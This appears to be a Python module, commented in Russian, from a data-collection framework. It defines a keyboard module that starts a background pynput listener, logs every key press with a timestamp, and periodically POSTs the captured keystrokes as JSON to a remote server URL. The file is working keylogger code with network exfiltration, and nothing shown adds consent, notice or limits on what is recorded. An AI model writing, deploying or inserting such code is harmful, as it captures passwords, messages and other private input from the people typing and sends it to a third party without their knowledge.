from threading import Thread
from pynput.keyboard import Listener
from time import time
from . import BaseModule
from requests import post
from logging import info


class KeyboardModule(BaseModule):
    key_events = list()

    def __init__(self):
        super().__init__(name='keyboard')

        # Создаем поток для трекинга нажатий на клавиатуру
        # передаем в функцию массив нажатых клавиш
        keys_thread = Thread(target=key_tracking, args=(self.key_events,))
        keys_thread.start()

    def update(self):
        # Метод отправки данных на сервер
        try:
            post(self.url, json=dict(id_device=0, source=101, value=self.key_events))
            info(f'Отправлены данные: {self.key_events}')
            self.key_events.clear()  # Отчищаем массив нажатых клавиш
        except Exception as exception:
            info(f'Возникла проблема при подключению: {exception}')


def key_tracking(key_events):
    # Метод обрабатывающий нажатие клавиш
    # при получении события нажатия на кнопку добавляем данные в массив
    with Listener(on_press=lambda key: key_events.append(dict(time=time(), button=str(key)))) as listener:
        listener.join()
